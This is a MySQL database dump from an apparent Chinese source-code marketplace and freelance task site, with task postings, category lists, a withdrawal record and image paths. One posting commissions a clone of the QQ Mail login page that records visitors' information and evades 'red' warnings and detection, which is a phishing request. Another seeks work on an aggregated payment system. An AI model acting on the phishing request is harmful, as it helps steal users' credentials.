(28, '1528603407task15', 15, '2018-06-10 12:03:27', 100, '站长交易服务平台 -163aas.com- 站长商城 - 源码商城站长源码交易', '<p><img src="http://t5.928vip.cn/config/ueditor/php/upload1/20180610/15286033929098.jpg" title="1515565129832_meitu_1.jpg"/></p>', 1, 800, 0, 0, 0, 0, 0, '2018-06-10 12:03:27', 0, 0, 10, '2018-06-20 12:05:32', 0, 1, 1, 0, 0, '', 1, 5, 0, NULL),
(29, '1528603459task15', 15, '2018-06-10 12:04:19', 10, '源码商城站长源码交易免费入住', '<p><img src="http://t5.928vip.cn/config/ueditor/php/upload1/20180610/15286034515920.jpg" title="1515565129832_meitu_1.jpg"/></p>', 1, 500, 0, 0, 0, 0, 0, '2018-06-10 12:04:19', 0, 0, 10, '2018-06-20 12:04:31', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(30, '1533224811task188', 188, '2018-08-02 23:46:51', 10, '543445677889900', '<p>5445567778</p>', 1, 54, 0, 10, 0, 0, 0, '2018-08-02 23:46:51', 0, 0, 3, '2018-08-05 23:59:49', 0, 1, 1, 1, 0, '', 0, 1, 0, NULL),
(31, '1544510075task220', 220, '2018-12-11 14:34:35', 1, 'test', '<p>这个是测试任务</p>', 1, 100, 0, 0, 0, 0, 0, '2018-12-11 14:34:35', 0, 0, 3, '2018-12-14 14:34:35', 0, 1, 1, 0, 0, '74-1544510075-220.png', 0, 1, 0, 0),
(32, '1547993127task227', 227, '2019-01-20 22:05:27', 105, '123', '<p><img src="/ueditor/php/upload/image/20190120/1547992963117945.png" style=""/></p><p><img src="/ueditor/php/upload/image/20181227/1545903101558552.png" style=""/></p><p><br/></p>', 1, 100, 0, 0, 0, 0, 0, '2019-01-20 22:05:27', 0, 0, 10, '2019-04-20 22:05:27', 0, 1, 1, 1, 0, '', 1, 10, 0, 0),
(34, '1557230097task149', 149, '2019-05-07 19:54:57', 10, '你赶紧你几点睡关键是不能改变多个代表福建省大概就是', '<p>你赶紧你几点睡关键是不能改变多个代表福建省大概就是</p>', 1, 800, 0, 0, 0, 0, 0, '2019-05-07 19:54:57', 0, 0, 3, '2019-05-10 19:54:57', 1, 1, 1, 0, 0, '', 0, 1, 0, 0),
(35, '1560337443task15', 15, '2019-06-12 19:04:03', 10, '仿个单页，主要是能防红，实现域名后面加代码', '<p><strong style="margin: 0px auto; color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">具体要求：</strong><span style="color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">&nbsp;</span><br style="margin: 0px auto; color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"/></p><p style="margin-top: 0px; margin-bottom: 0px; padding: 0px; -webkit-tap-highlight-color: transparent; color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">https://mail.qq.com/仿这个页面，后台就是记录点信息，有删除导入功能，主要是能防红防检测，实现域名后面加代码，有经验的来</p><p><br/></p>', 1, 200, 0, 0, 0, 0, 0, '2019-06-12 19:04:03', 0, 0, 3, '2019-06-15 19:04:03', 0, 1, 1, 0, 0, '', 0, 1, 0, 0),
(36, '1560337510task15', 15, '2019-06-12 19:05:10', 10, 'H5需对接开发者ID才能封装APP,会的来', '<p><strong style="margin: 0px auto; color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">具体要求：</strong><span style="color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">&nbsp;</span><br style="margin: 0px auto; color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"/></p><p style="margin-top: 0px; margin-bottom: 0px; padding: 0px; -webkit-tap-highlight-color: transparent; color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">目前用网页地址封装后APP打不开，提示，请在微信客户端打开链接，。需接入开发者ID，会弄的来，另有 好友圈（俱乐部） 要修复</p><p><br/></p>', 1, 500, 0, 0, 0, 0, 0, '2019-06-12 19:05:10', 0, 0, 3, '2019-06-15 19:05:10', 0, 1, 1, 0, 0, '', 0, 1, 0, 0),
(37, '1560337539task15', 15, '2019-06-12 19:05:39', 10, '需要仿一个百度云资源分享论坛网站——盘乐网，具体见下面任务', '<p><span style="color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">我目前的网站资源帖子不多，想复制盘乐网：http://www.pan6.com，现有所有的资源帖子，包括文字图片（图片需去掉盘乐网水印），以及每个帖子的提取码。</span></p>', 1, 5000, 0, 0, 0, 0, 0, '2019-06-12 19:05:39', 0, 0, 3, '2019-06-15 19:05:39', 0, 1, 1, 0, 0, '', 0, 1, 0, 0),
(38, '1560337570task15', 15, '2019-06-12 19:06:10', 10, '对接一个零钱到账的汇款接口', '<p><span style="color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">之前对接的fastpay现在要对接另一家的汇款接口</span></p>', 1, 200, 0, 0, 0, 0, 0, '2019-06-12 19:06:10', 0, 0, 10, '2019-06-27 19:06:10', 0, 1, 1, 0, 0, '', 0, 1, 0, 0),
(39, '1560337602task15', 15, '2019-06-12 19:06:42', 10, 'ecshop商城网站搬迁数据表报错，可以修复的来，速度', '<ul class="b_l_tit list-paddingleft-2" style="list-style-type: none;"><li><p>ecshop商城网站搬迁数据表报错，可以修复的来，速度</p></li></ul><p><br/></p>', 1, 100, 0, 0, 0, 0, 0, '2019-06-12 19:06:42', 0, 0, 7, '2019-06-27 19:06:42', 0, 1, 1, 0, 0, '', 0, 1, 0, 0),
(40, '1560337641task15', 15, '2019-06-12 19:07:21', 10, '对接一次2000，已有自己的聚合系统，求技术帮忙对接上游通道并把功能对接入后台', '<p><span style="color: rgb(51, 51, 51); font-family: 微软雅黑, &quot;microsoft yahei&quot;, 宋体, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">确定有正在运营的四方聚合支付系统，需要技术把上游三方通道对接进我的聚合系统，并能对通道进行风控，风控规则接入后台。一次一结。有能力接单维护的技术来，不墨迹。</span></p>', 1, 2000, 0, 0, 0, 0, 0, '2019-06-12 19:07:21', 0, 0, 7, '2019-06-27 19:07:21', 0, 1, 1, 0, 0, '', 0, 1, 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_taskhf`
--

CREATE TABLE IF NOT EXISTS `yjcode_taskhf` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `uip` char(30) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `useridhf` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `txt` text,
  `ifxz` int(10) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `xgnum` int(10) DEFAULT NULL,
  `mybh` char(50) DEFAULT NULL,
  `taskty` int(10) DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `oksj` datetime DEFAULT NULL,
  `zbsj` datetime DEFAULT NULL,
  `ystxt` text,
  `rwdq` datetime DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_tasklog`
--

CREATE TABLE IF NOT EXISTS `yjcode_tasklog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `useridhf` int(10) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `txt` text,
  `sj` datetime DEFAULT NULL,
  `fj` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_tasktype`
--

CREATE TABLE IF NOT EXISTS `yjcode_tasktype` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name1` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `admin` int(10) DEFAULT '1',
  `name2` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=44 ;

--
-- 转存表中的数据 `yjcode_tasktype`
--

INSERT INTO `yjcode_tasktype` (`id`, `name1`, `sj`, `xh`, `admin`, `name2`) VALUES
(1, '网站开发', '2017-03-02 20:17:13', 1, 1, NULL),
(2, 'APP开发', '2017-03-02 20:31:26', 2, 1, NULL),
(3, '网站仿制', '2017-03-02 20:17:37', 3, 1, NULL),
(4, '美化设计', '2017-03-02 20:17:48', 4, 1, NULL),
(5, '网络推广', '2017-03-02 20:18:00', 5, 1, NULL),
(6, 'SEO', '2017-03-02 20:18:12', 6, 1, NULL),
(7, '软件开发', '2017-03-02 20:19:00', 7, 1, NULL),
(8, '服务器', '2017-03-02 20:19:08', 8, 1, NULL),
(9, '其他', '2017-03-02 20:19:24', 9, 1, NULL),
(10, '网站开发', '2017-03-02 20:19:50', 1, 2, '全新开发'),
(11, '网站开发', '2017-03-02 20:20:01', 2, 2, '二次开发'),
(12, '网站开发', '2017-03-02 20:20:07', 3, 2, 'API开发'),
(13, '网站开发', '2017-03-02 20:20:13', 4, 2, '手机网站'),
(14, '网站开发', '2017-03-02 20:20:20', 5, 2, '前端切图'),
(15, '网站开发', '2017-03-02 20:20:31', 6, 2, '微信小程序'),
(16, 'APP开发', '2017-03-02 20:20:57', 1, 2, 'IOS开发'),
(17, 'APP开发', '2017-03-02 20:21:06', 2, 2, 'Android开发'),
(18, 'APP开发', '2017-03-02 20:21:13', 3, 2, 'WP8开发'),
(19, 'APP开发', '2017-03-02 20:21:22', 4, 2, '微信开发'),
(20, '网站仿制', '2017-03-02 20:21:45', 1, 2, 'CMS模板'),
(21, '网站仿制', '2017-03-02 20:21:52', 2, 2, '扒皮建站'),
(22, '美化设计', '2017-03-02 20:22:28', 1, 2, '网页设计'),
(23, '美化设计', '2017-03-02 20:22:37', 2, 2, '广告设计'),
(24, '美化设计', '2017-03-02 20:22:45', 3, 2, '图片处理'),
(25, '美化设计', '2017-03-02 20:23:08', 4, 2, 'LOGO设计'),
(26, '美化设计', '2017-03-02 20:23:16', 5, 2, 'UI设计'),
(27, '美化设计', '2017-03-02 20:24:12', 6, 2, 'VI设计'),
(28, '网络推广', '2017-03-02 20:24:36', 1, 2, '软文发布'),
(29, '网络推广', '2017-03-02 20:25:02', 2, 2, '微信推广'),
(30, '网络推广', '2017-03-02 20:25:12', 3, 2, '邮件推广'),
(31, '网络推广', '2017-03-02 20:25:38', 4, 2, '短信推广'),
(32, '网络推广', '2017-03-02 20:25:47', 5, 2, '其他推广'),
(33, 'SEO', '2017-03-02 20:26:08', 1, 2, '关键词排名'),
(34, 'SEO', '2017-03-02 20:26:22', 2, 2, 'SEO方案'),
(35, 'SEO', '2017-03-02 20:26:32', 3, 2, '降权恢复'),
(36, 'SEO', '2017-03-02 20:26:41', 4, 2, '原创写作'),
(37, '软件开发', '2017-03-02 20:27:30', 1, 2, '界面美化'),
(38, '软件开发', '2017-03-02 20:27:42', 2, 2, '补丁脚本'),
(39, '软件开发', '2017-03-02 20:27:50', 3, 2, '软件定制'),
(40, '服务器', '2017-03-02 20:28:07', 1, 2, 'win型服务'),
(41, '服务器', '2017-03-02 20:28:16', 2, 2, 'Linux型服务'),
(42, '服务器', '2017-03-02 20:28:24', 3, 2, '其他型服务'),
(43, '其他', '2017-03-02 20:28:41', 1, 2, '其他任务');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_tixian`
--

CREATE TABLE IF NOT EXISTS `yjcode_tixian` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(40) DEFAULT NULL,
  `txyh` char(30) DEFAULT NULL,
  `txname` char(30) DEFAULT NULL,
  `txzh` char(50) DEFAULT NULL,
  `txkhh` char(50) DEFAULT NULL,
  `zt` int(11) DEFAULT NULL,
  `sm` varchar(250) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `yjcode_tixian`
--

INSERT INTO `yjcode_tixian` (`id`, `bh`, `userid`, `money1`, `sj`, `uip`, `txyh`, `txname`, `txzh`, `txkhh`, `zt`, `sm`) VALUES
(1, '1556470011tx849', 849, 100, '2019-04-29 00:46:51', '112.224.33.133', '支付宝', '达富', '435456345345', '', 4, '');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_tk`
--

CREATE TABLE IF NOT EXISTS `yjcode_tk` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `money1` float DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `tkoksj` datetime DEFAULT NULL,
  `selluserid` int(11) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `probh` char(50) DEFAULT NULL,
  `tkly` text,
  `orderbh` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_tp`
--

CREATE TABLE IF NOT EXISTS `yjcode_tp` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `tp` varchar(200) DEFAULT NULL,
  `type1` char(30) DEFAULT NULL,
  `iffm` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `xh` int(11) DEFAULT NULL,
  `upty` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=242 ;

--
-- 转存表中的数据 `yjcode_tp`
--

INSERT INTO `yjcode_tp` (`id`, `bh`, `tp`, `type1`, `iffm`, `sj`, `userid`, `xh`, `upty`) VALUES
(204, '1554701587-15', 'upload/15/1554701587-15/201904080133211016.jpg', '鍟嗗搧', NULL, '2019-04-08 13:33:24', 15, 1, NULL),
(203, '1554700598-15', 'upload/15/1554700598-15/201904080117029578.jpg', '鍟嗗搧', NULL, '2019-04-08 13:17:03', 15, 1, NULL),
(98, '1528212467-158', 'upload/158/1528212467-158/0016602001528212474tp158.jpg', '商品', NULL, '2018-06-05 23:27:54', 158, 1, NULL),
(202, '1554700598-15', 'upload/15/1554700598-15/201904080116568530.jpg', '鍟嗗搧', NULL, '2019-04-08 13:16:57', 15, 1, NULL),
(201, '1554700535-15', 'upload/15/1554700535-15/201904080115391648.jpg', '鍟嗗搧', NULL, '2019-04-08 13:15:43', 15, 1, NULL),
(19, '1488553874-15', 'upload/15/1488553874-15/0094379001488553966f15.jpg', '商品', NULL, '2017-03-03 23:12:46', 15, 1, NULL),
(163, '1554034828-15', 'upload/15/1554034828-15/201903310821421606.jpg', '鍟嗗搧', NULL, '2019-03-31 20:21:43', 15, 1, NULL),
(167, '1554035421-15', 'upload/15/1554035421-15/201903310830241806.jpg', '鍟嗗搧', NULL, '2019-03-31 20:30:28', 15, 1, NULL),
(168, '1554035461-15', 'upload/15/1554035461-15/201903310831117351.jpg', '鍟嗗搧', NULL, '2019-03-31 20:31:14', 15, 1, NULL),
(170, '1554035525-15', 'upload/15/1554035525-15/201903310832081384.jpg', '鍟嗗搧', NULL, '2019-03-31 20:32:12', 15, 1, NULL),
(171, '1554035561-15', 'upload/15/1554035561-15/201903310832444475.jpg', '鍟嗗搧', NULL, '2019-03-31 20:32:48', 15, 1, NULL),
(70, '1490603043n45', 'upload/news/20170327/1490603043n45/1515340989.jpg', '资讯', 1, '2018-01-08 00:03:09', 0, 1, NULL),
(64, '1514732818081', 'upload/14/1514732818081/0219883001514732897f14.jpg', '评价', NULL, '2017-12-31 23:08:17', 14, 1, NULL),
(172, '1554035586-15', 'upload/15/1554035586-15/201903310833096459.jpg', '鍟嗗搧', NULL, '2019-03-31 20:33:10', 15, 1, NULL),
(173, '1554035608-15', 'upload/15/1554035608-15/201903310833319405.jpg', '鍟嗗搧', NULL, '2019-03-31 20:33:33', 15, 1, NULL),
(174, '1554035630-15', 'upload/15/1554035630-15/201903310833535834.jpg', '鍟嗗搧', NULL, '2019-03-31 20:33:54', 15, 1, NULL),
(175, '1554035671-15', 'upload/15/1554035671-15/201903310834340077.jpg', '鍟嗗搧', NULL, '2019-03-31 20:34:35', 15, 1, NULL),
(176, '1554035774-15', 'upload/15/1554035774-15/201903310836207757.jpg', '鍟嗗搧', NULL, '2019-03-31 20:36:26', 15, 1, NULL),
(177, '1554035808-15', 'upload/15/1554035808-15/201903310836512479.jpg', '鍟嗗搧', NULL, '2019-03-31 20:36:53', 15, 1, NULL),
(178, '1554035827-15', 'upload/15/1554035827-15/201903310837109676.jpg', '鍟嗗搧', NULL, '2019-03-31 20:37:13', 15, 1, NULL),
(179, '1554035852-15', 'upload/15/1554035852-15/201903310837411134.jpg', '鍟嗗搧', NULL, '2019-03-31 20:37:45', 15, 1, NULL),
(180, '1554036356-15', 'upload/15/1554036356-15/201903310845596658.jpg', '鍟嗗搧', NULL, '2019-03-31 20:46:01', 15, 1, NULL),
(181, '1554036378-15', 'upload/15/1554036378-15/201903310846218184.jpg', '鍟嗗搧', NULL, '2019-03-31 20:46:24', 15, 1, NULL),
(182, '1554036391-15', 'upload/15/1554036391-15/201903310847231424.jpg', '鍟嗗搧', NULL, '2019-03-31 20:47:26', 15, 1, NULL),
(183, '1554036457-15', 'upload/15/1554036457-15/201903310847476062.jpg', '鍟嗗搧', NULL, '2019-03-31 20:47:53', 15, 1, NULL),
(184, '1554036494-15', 'upload/15/1554036494-15/201903310848249566.jpg', '鍟嗗搧', NULL, '2019-03-31 20:48:25', 15, 1, NULL),
(185, '1554036529-15', 'upload/15/1554036529-15/201903310848536353.jpg', '鍟嗗搧', NULL, '2019-03-31 20:48:54', 15, 1, NULL),
(186, '1554036580-15', 'upload/15/1554036580-15/201903310849492082.jpg', '鍟嗗搧', NULL, '2019-03-31 20:49:51', 15, 1, NULL),
(187, '1554037652-15', 'upload/15/1554037652-15/201903310907350304.jpg', '鍟嗗搧', NULL, '2019-03-31 21:07:36', 15, 1, NULL),
(68, '1490604408n40', 'upload/news/20170327/1490604408n40/1515340960.jpg', '资讯', 1, '2018-01-08 00:02:40', 0, 1, NULL),
(67, '1490604470n21', 'upload/news/20170327/1490604470n21/1515340951.jpg', '资讯', 1, '2018-01-08 00:02:31', 0, 1, NULL),
(66, '1490604692n44', 'upload/news/20170327/1490604692n44/1515340942.jpg', '资讯', 1, '2018-01-08 00:02:22', 0, 1, NULL),
(71, '1490604766n56', 'upload/news/20170327/1490604766n56/1515341016.jpg', '资讯', 1, '2018-01-08 00:03:36', 0, 1, NULL),
(69, '1490603418n69', 'upload/news/20170327/1490603418n69/1515340969.jpg', '资讯', 1, '2018-01-08 00:02:49', 0, 1, NULL),
(97, '1528209679-162', 'upload/162/1528209679-162/0962361001528209877tp162.jpg', '商品', NULL, '2018-06-05 22:44:37', 162, 1, NULL),
(101, '1535087957-3', '/upload/20180824/0694955001531985882tp21416-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(102, '1535087966-3', '/upload/20180824/0071869001531984059tp21416-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(99, '1535087773-3', 'http://faq.locoy.com/Data/Question/WindowsLiveWriter/875750ede508_9410/clip_image014_thumb.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(83, '1521686861-15', 'upload/15/1521686861-15/0915528001521686879tp15.jpg', '商品', NULL, '2018-03-22 10:47:59', 15, 1, NULL),
(85, '1522307315-15', 'upload/15/1522307315-15/0565002001522307337tp15.jpg', '商品', NULL, '2018-03-29 15:08:57', 15, 1, NULL),
(100, '1535087952-3', '/upload/20180824/0540243001531984524tp21416-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(103, '1535087967-3', '/upload/20180824/0826323001532706120tp21961-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(104, '1535087969-3', '/upload/20180824/0229190001532161209tp21416-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(105, '1535087971-3', '/upload/20180824/0815257001533880035tp18676-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(106, '1535088011-3', '/upload/20180824/0740253001532618948tp21961-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(107, '1535088027-3', '/upload/20180824/0784591001533880421tp18676-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(108, '1535088028-3', '/upload/20180824/0452833001533458533tp21961-1.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(109, '1535088671-3', 'http://faq.locoy.com/Data/Question/WindowsLiveWriter/875750ede508_9410/clip_image014_thumb.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(110, '1535089129-3', 'http://faq.locoy.com/Data/Question/WindowsLiveWriter/875750ede508_9410/clip_image014_thumb.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(112, '1535089313-3', 'http://faq.locoy.com/Data/Question/WindowsLiveWriter/875750ede508_9410/clip_image014_thumb.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(113, '1535089313-3', 'http://faq.locoy.com/Data/Question/WindowsLiveWriter/875750ede508_9410/clip_image014_thumb.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(114, '1535089313-3', 'http://faq.locoy.com/Data/Question/WindowsLiveWriter/875750ede508_9410/clip_image014_thumb.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(115, '1535089453-3', 'http://faq.locoy.com/Data/Question/WindowsLiveWriter/875750ede508_9410/clip_image014_thumb.jpg', '商品', NULL, '2018-08-24 00:00:00', 3, 1, NULL),
(116, '1535089507-15', 'http://faq.locoy.com/Data/Question/WindowsLiveWriter/875750ede508_9410/clip_image014_thumb.jpg', '商品', NULL, '2018-08-24 00:00:00', 15, 1, NULL),
(200, '1554653163-15', 'upload/15/1554653163-15/201904081207135033.jpg', '鍟嗗搧', NULL, '2019-04-08 00:07:17', 15, 1, NULL),
(158, '1543674505-15', 'upload/15/1543674505-15/0946628001543674516tp15.jpg', '商品', NULL, '2018-12-01 22:28:36', 15, 1, NULL),
(205, '1554701775-15', 'upload/15/1554701775-15/201904080136188598.jpg', '鍟嗗搧', NULL, '2019-04-08 13:36:19', 15, 1, NULL),
(206, '1554703664-15', 'upload/15/1554703664-15/201904080207475615.jpg', '鍟嗗搧', NULL, '2019-04-08 14:07:48', 15, 1, NULL),
(211, '1557221794-15', 'upload/15/1557221794-15/201905070537197373.jpg', '鍟嗗搧', NULL, '2019-05-07 17:37:20', 15, 1, NULL),
(212, '1557221998-15', 'upload/15/1557221998-15/201905070541021178.jpg', '鍟嗗搧', NULL, '2019-05-07 17:41:04', 15, 1, NULL),
(213, '1557221998-15', 'upload/15/1557221998-15/201905070542065795.jpg', '鍟嗗搧', NULL, '2019-05-07 17:42:08', 15, 1, NULL),
(226, '1560093985-14', 'upload/14/1560093985-14/201906091126312399.jpg', '鍟嗗搧', NULL, '2019-06-09 23:26:34', 14, 1, NULL),
(215, '1557811155-15', 'upload/15/1557811155-15/201905140119420423.jpg', '鍟嗗搧', NULL, '2019-05-14 13:19:44', 15, 1, NULL),
(223, '1560093851-14', 'upload/14/1560093851-14/201906091124181062.jpg', '鍟嗗搧', NULL, '2019-06-09 23:24:20', 14, 1, NULL),
(224, '1560093907-14', 'upload/14/1560093907-14/201906091125138008.jpg', '鍟嗗搧', NULL, '2019-06-09 23:25:16', 14, 1, NULL),
(225, '1560093952-14', 'upload/14/1560093952-14/201906091125584589.jpg', '鍟嗗搧', NULL, '2019-06-09 23:26:02', 14, 1, NULL),
(227, '1560094030-14', 'upload/14/1560094030-14/201906091127180999.jpg', '鍟嗗搧', NULL, '2019-06-09 23:27:21', 14, 1, NULL),
(228, '1560094057-14', 'upload/14/1560094057-14/201906091127494164.jpg', '鍟嗗搧', NULL, '2019-06-09 23:27:51', 14, 1, NULL),
(229, '1560094093-14', 'upload/14/1560094093-14/201906091128212584.jpg', '鍟嗗搧', NULL, '2019-06-09 23:28:27', 14, 1, NULL),
(230, '1560094132-14', 'upload/14/1560094132-14/201906091128586533.jpg', '鍟嗗搧', NULL, '2019-06-09 23:28:59', 14, 1, NULL),
(231, '1560094186-14', 'upload/14/1560094186-14/201906091130004544.jpg', '鍟嗗搧', NULL, '2019-06-09 23:30:01', 14, 1, NULL),
(232, '1560094233-14', 'upload/14/1560094233-14/201906091130460206.jpg', '鍟嗗搧', NULL, '2019-06-09 23:30:47', 14, 1, NULL),
(233, '1560094323-14', 'upload/14/1560094323-14/201906091132109048.jpg', '鍟嗗搧', NULL, '2019-06-09 23:32:11', 14, 1, NULL),
(234, '1560094352-14', 'upload/14/1560094352-14/201906091132384098.jpg', '鍟嗗搧', NULL, '2019-06-09 23:32:41', 14, 1, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_txtmb`
--

CREATE TABLE IF NOT EXISTS `yjcode_txtmb` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `mbid` char(10) DEFAULT NULL,
  `tit` char(50) DEFAULT NULL,
  `txt` text,
  `admin` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=9 ;

--
-- 转存表中的数据 `yjcode_txtmb`
--

INSERT INTO `yjcode_txtmb` (`id`, `mbid`, `tit`, `txt`, `admin`) VALUES
(8, '001', '大图模板', '适合以效果图展示为主的商品', 1);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_type`
--

CREATE TABLE IF NOT EXISTS `yjcode_type` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `admin` int(11) DEFAULT NULL,
  `type1` char(50) DEFAULT NULL,
  `type2` char(50) DEFAULT NULL,
  `type3` char(50) DEFAULT NULL,
  `xh` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `col` char(30) DEFAULT NULL,
  `iftj` int(10) DEFAULT NULL,
  `buyform` text,
  `type4` char(50) DEFAULT NULL,
  `type5` char(50) DEFAULT NULL,
  `sellbl` float DEFAULT NULL,
  `tjmoney` float DEFAULT NULL,
  `seokey` varchar(220) DEFAULT NULL,
  `seodes` varchar(250) DEFAULT NULL,
  `seotit` varchar(250) DEFAULT NULL,
  `dbsj` int(10) DEFAULT NULL,
  `jygz` text,
  `propx` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=152 ;

--
-- 转存表中的数据 `yjcode_type`
--

INSERT INTO `yjcode_type` (`id`, `admin`, `type1`, `type2`, `type3`, `xh`, `sj`, `col`, `iftj`, `buyform`, `type4`, `type5`, `sellbl`, `tjmoney`, `seokey`, `seodes`, `seotit`, `dbsj`, `jygz`, `propx`) VALUES
(37, 1, '源码/集市', NULL, NULL, 1, '2019-06-09 22:25:43', '#333', 0, NULL, NULL, NULL, 0, 0, '', '所有源码均54455测试可用，请放心选购', '', 1, '', 0),
(38, 1, '企业/网站', NULL, NULL, 2, '2019-06-09 22:25:22', '#333', 0, NULL, NULL, NULL, 0, 0, '王者荣耀充值、梦幻西游充值', '专业的游戏点卡供应平台，担保交易，极速发货，全程无忧', '专业的游戏点卡供应平台', 0, '', 0),
(39, 1, '实物/交易', NULL, NULL, 3, '2019-06-08 20:54:41', '#333', 1, NULL, NULL, NULL, 0, 0, '', '全场包邮，每天搜罗精品供您选购', '', 0, '', 0),
(40, 2, '源码/集市', 'QQ非主流/图片', NULL, 1, '2019-06-12 22:51:09', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL),
(41, 2, '源码/集市', '电影/视频/音乐', NULL, 2, '2019-06-12 22:51:35', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL),
(42, 2, '源码/集市', '游戏/动漫/竞技', NULL, 3, '2019-06-12 22:51:55', NULL, NULL, '', NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL),
